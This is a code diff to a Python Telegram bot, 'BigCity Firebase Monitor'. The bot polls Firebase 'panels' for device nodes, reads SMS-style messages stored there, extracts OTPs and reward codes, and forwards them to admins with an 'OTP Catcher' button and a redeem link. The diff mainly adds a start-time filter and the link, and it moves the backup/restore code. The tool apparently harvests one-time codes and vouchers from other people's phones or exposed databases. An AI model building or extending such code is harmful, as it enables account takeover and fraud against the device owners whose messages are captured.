@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (Manual Backup + Restore + Maintenance)
+BigCity Firebase Monitor Bot (Strict Time + Redeem Link + Backup)
 """
 import asyncio
 import json
@@ -39,6 +39,7 @@ ADMINS_FILE = BASE_DIR / "admins.json"
 PANELS_FILE = BASE_DIR / "panels.json"
 MAINTENANCE_FILE = BASE_DIR / "maintenance.json"
 
+BOT_START_TIME = time.time() 
 IS_INITIALIZED = False
 IS_MAINTENANCE = False
 MAX_CONCURRENT = 30
@@ -90,7 +91,7 @@ def save_panels(p): save_json(PANELS_FILE, p)
 def load_state(): return load_json(STATE_FILE, {})
 def save_state(s): save_json(STATE_FILE, s)
 
-# ─── MAINTENANCE MODE MANAGER ────────────────────────────────────────────────
+# ─── MAINTENANCE MODE ────────────────────────────────────────────────────────
 def load_maintenance():
     global IS_MAINTENANCE
     data = load_json(MAINTENANCE_FILE, {"status": False})
@@ -119,7 +120,7 @@ def is_admin(cid: int):
         return True
     return cid in admins
 
-# ─── FIREBASE URL PARSER ─────────────────────────────────────────────────────
+# ─── FIREBASE HELPERS ────────────────────────────────────────────────────────
 
 def parse_firebase_link(link: str):
     try:
@@ -129,8 +130,6 @@ def parse_firebase_link(link: str):
             return None
         return f"{p.scheme}://{p.netloc}".rstrip("/")
     except Exception: return None
-
-# ─── API HELPERS ─────────────────────────────────────────────────────────────
 
 async def api_get(client, url, timeout=API_TIMEOUT):
     async with semaphore:
@@ -193,12 +192,22 @@ def _extract_number(d: dict) -> str:
             if cleaned: return cleaned
     return ""
 
-def extract_sender_time(md: dict):
-    dt = md.get("dateTime", md.get("time", md.get("timestamp","")))
-    if isinstance(dt, (int, float)):
-        try: dt = datetime.fromtimestamp(dt/1000 if dt>1e12 else dt).strftime("%d-%m-%Y | %I:%M %p")
-        except Exception: dt = str(dt)
-    return str(dt)
+def get_msg_timestamp(md: dict) -> float:
+    dt_str = md.get("dateTime", md.get("time", md.get("timestamp", "")))
+    if not dt_str: return 0.0
+    if isinstance(dt_str, (int, float)):
+        return (dt_str / 1000.0) if dt_str > 1e12 else float(dt_str)
+    
+    dt_str = str(dt_str).strip()
+    match = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2}\s*[apAP][mM])', dt_str)
+    if match:
+        try:
+            date_part = match.group(1)
+            time_part = match.group(2).lower()
+            dt = datetime.strptime(f"{date_part} {time_part}", "%d-%m-%Y %I:%M %p")
+            return dt.timestamp()
+        except Exception: pass
+    return 0.0
 
 async def fetch_online_devices(client, base, dev_node):
     path = f"/{dev_node}" if dev_node else ""
@@ -225,15 +234,25 @@ def classify_bigcity(text: str):
     if m: return "otp", m.group(1)
     return None, None
 
+def extract_sender_time(md: dict):
+    dt = md.get("dateTime", md.get("time", md.get("timestamp","")))
+    if isinstance(dt, (int, float)):
+        try: dt = datetime.fromtimestamp(dt/1000 if dt>1e12 else dt).strftime("%d-%m-%Y | %I:%M %p")
+        except Exception: dt = str(dt)
+    return str(dt)
+
 def extract_text(md: dict):
     for f in ("message","body","text","msg","SMS","content"):
         if f in md and md[f]: return str(md[f])
     return ""
 
-# ─── PREMIUM SHORT FORMATTERS ────────────────────────────────────────────────
+# ─── PREMIUM FORMATTERS (With Text Link) ─────────────────────────────────────
 
-def fmt_reward(panel, did, num, dt, code, token):
-    btn = InlineKeyboardMarkup([[InlineKeyboardButton("🎯 OTP Catcher", callback_data=f"otp|{token}")]])
+def fmt_reward(panel, did, num, dt, code):
+    # Button for OTP Catcher only
+    btn = InlineKeyboardMarkup([[InlineKeyboardButton("🎯 OTP Catcher", callback_data=f"otp|{panel}~{did}~{int(time.time())}")]])
+    
+    # Yahan clickable link use kiya hai (<a href="...">)
     txt = (
         "🎁 <b>𝐁𝐈𝐆𝐂𝐈𝐓𝐘 𝐑𝐄𝐖𝐀𝐑𝐃</b> 🎁\n"
         "━━━━━━━━━━━━━━━━━━\n"
@@ -242,7 +261,8 @@ def fmt_reward(panel, did, num, dt, code, token):
         f"🔢 <b>𝐍𝐮𝐦𝐛𝐞𝐫:</b> <code>{num or 'N/A'}</code>\n"
         f"⏰ <b>𝐓𝐢𝐦𝐞:</b> {dt}\n"
         "━━━━━━━━━━━━━━━━━━\n"
-        f"🎟 <b>𝐂𝐨𝐝𝐞:</b> <code>{code}</code>"
+        f"🎟 <b>𝐂𝐨𝐝𝐞:</b> <code>{code}</code>\n\n"
+        "👇 <b>Redeem Here:</b> <a href='https://www.golddropwins.com/'>golddropwins.com</a>"
     )
     return txt, btn
 
@@ -257,56 +277,6 @@ def fmt_otp(panel, did, num, dt, otp):
         "━━━━━━━━━━━━━━━━━━\n"
         f"🔑 <b>𝐎𝐓𝐏:</b> <code>{otp}</code>"
     )
-
-# ─── MANUAL BACKUP & RESTORE ─────────────────────────────────────────────────
-
-async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_chat.id): return
-    panels = load_panels()
-    admins = get_admins()
-    state = load_state()
-    
-    backup_data = {
-        "panels": panels,
-        "admins": admins,
-        "state": state
-    }
-    
-    backup_str = json.dumps(backup_data, indent=2)
-    
-    with open("backup.txt", "w") as f:
-        f.write(backup_str)
-        
-    await update.message.reply_text("📦 <b>Backup Ready!</b>\nYeh file save kar lo, aage deploy ke baad restore karne ke liye.", parse_mode="HTML")
-    await update.message.reply_document(document=open("backup.txt", "rb"), filename="bot_backup.txt")
-
-async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_chat.id): return
-    await update.message.reply_text("📂 <b>Restore:</b> Kripya apni backup.txt file bhejein (attach as document).", parse_mode="HTML")
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_chat.id): return
-    doc = update.message.document
-    if not doc.file_name.endswith(".txt") and not doc.file_name.endswith(".json"):
-        return await update.message.reply_text("❌ Sirf .txt ya .json file allowed hai.")
-    
-    file = await doc.get_file()
-    await file.download_to_drive("restore_temp.txt")
-    
-    try:
-        with open("restore_temp.txt", "r") as f:
-            data = json.load(f)
-            
-        if "panels" in data:
-            save_panels(data["panels"])
-        if "admins" in data:
-            save_admins(data["admins"])
-        if "state" in data:
-            save_state(data["state"])
-            
-        await update.message.reply_text("✅ <b>Restore Successful!</b>\nSaara data wapas aa gaya.", parse_mode="HTML")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Restore failed: {str(e)}")
 
 # ─── MONITORING ──────────────────────────────────────────────────────────────
 
@@ -325,8 +295,16 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             key = f"{pk}:{did}:{mid}"
             
             if state.get(key): continue
+            
+            # 🛑 Strict Time Check
+            msg_time = get_msg_timestamp(md)
+            if msg_time > 0 and msg_time < BOT_START_TIME:
+                state[key] = True
+                continue
+            
             if not IS_INITIALIZED:
-                state[key] = True; continue
+                state[key] = True
+                continue
             
             text = extract_text(md)
             if not text:
@@ -335,6 +313,7 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             if not kind:
                 state[key] = True; continue
                 
+            # Anti-Spam (Bomber)
             now = time.time()
             if pk not in panel_spam_tracker:
                 panel_spam_tracker[pk] = []
@@ -356,8 +335,7 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             dt = extract_sender_time(md)
             
             if kind == "reward":
-                token = f"{pk}~{did}~{int(time.time())}"
-                txt, btn = fmt_reward(panel, did, num, dt, payload, token)
+                txt, btn = fmt_reward(panel, did, num, dt, payload)
                 for uid in admins:
                     try:
                         await app.bot.send_message(chat_id=uid, text=txt, parse_mode="HTML", reply_markup=btn, disable_web_page_preview=True)
@@ -424,22 +402,56 @@ async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
                 
     except Exception as e: logger.error(f"monitor outer: {e}")
 
-# ─── MAINTENANCE COMMANDS ────────────────────────────────────────────────────
+# ─── BACKUP & RESTORE ────────────────────────────────────────────────────────
+
+async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    panels = load_panels()
+    admins = get_admins()
+    state = load_state()
+    
+    backup_data = {"panels": panels, "admins": admins, "state": state}
+    backup_str = json.dumps(backup_data, indent=2)
+    
+    with open("backup.txt", "w") as f:
+        f.write(backup_str)
+        
+    await update.message.reply_text("📦 <b>Backup Ready!</b>\nYeh file save kar lo, aage deploy ke baad restore karne ke liye.", parse_mode="HTML")
+    await update.message.reply_document(document=open("backup.txt", "rb"), filename="bot_backup.txt")
+
+async def restore_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    await update.message.reply_text("📂 <b>Restore:</b> Kripya apni backup.txt file bhejein (attach as document).", parse_mode="HTML")
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    doc = update.message.document
+    if not doc.file_name.endswith(".txt") and not doc.file_name.endswith(".json"):
+        return await update.message.reply_text("❌ Sirf .txt ya .json file allowed hai.")
+    
+    file = await doc.get_file()
+    await file.download_to_drive("restore_temp.txt")
+    
+    try:
+        with open("restore_temp.txt", "r") as f:
+            data = json.load(f)
+            
+        if "panels" in data: save_panels(data["panels"])
+        if "admins" in data: save_admins(data["admins"])
+        if "state" in data: save_state(data["state"])
+            
+        await update.message.reply_text("✅ <b>Restore Successful!</b>\nSaara data wapas aa gaya.", parse_mode="HTML")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Restore failed: {str(e)}")
+
+# ─── MAINTENANCE & OTP CATCHER ───────────────────────────────────────────────
 
 async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_chat.id): return
-    
     status = "🔴 PAUSED (Maintenance)" if IS_MAINTENANCE else "🟢 ACTIVE"
-    out = (
-        f"🛠 <b>Maintenance Mode</b>\n━━━━━━━━━━━━━━━━━━\n"
-        f"Current Status: {status}\n\n"
-        "Agar aap Pause karenge toh bot scanning rok dega aur naye messages nahi aayenge.\n"
-        "Resume karne par wapas chalu ho jayega."
-    )
-    
+    out = f"🛠 <b>Maintenance Mode</b>\n━━━━━━━━━━━━━━━━━━\nCurrent Status: {status}\n\nPause karne par bot scan rok dega."
     btn_pause = InlineKeyboardButton("⏸ Pause", callback_data="maint_pause")
     btn_resume = InlineKeyboardButton("▶️ Resume", callback_data="maint_resume")
-    
     kb = InlineKeyboardMarkup([[btn_pause, btn_resume]])
     await update.message.reply_text(out, parse_mode="HTML", reply_markup=kb)
 
@@ -455,8 +467,6 @@ async def maintenance_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         save_maintenance(False)
         await q.answer("Bot Resumed (Maintenance Mode OFF)", show_alert=True)
         await q.edit_message_text("🛠 <b>Maintenance Mode</b>\n\nStatus: 🟢 <b>ACTIVE</b>\n\nBot wapas scan kar raha hai.", parse_mode="HTML")
-
-# ─── OTP CATCHER ─────────────────────────────────────────────────────────────
 
 async def otp_catcher_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -556,7 +566,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ["👑 Admin Panel","🛠 Maintenance"],
         ["📦 Backup", "📂 Restore"]
     ], resize_keyboard=True)
-    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Strict Scan\n• Short Msg\n• 🛠 Maintenance Mode\n• 📦 Backup/Restore\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
+    await update.message.reply_text(f"🤖 <b>BigCity Firebase Monitor</b>\n\n• Strict Time Check\n• Short Msg + Redeem Link\n• 🛠 Maintenance Mode\n• 📦 Backup/Restore\n\n👤 <code>{cid}</code>", parse_mode="HTML", reply_markup=kb)
 
 async def admin_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_chat.id): return
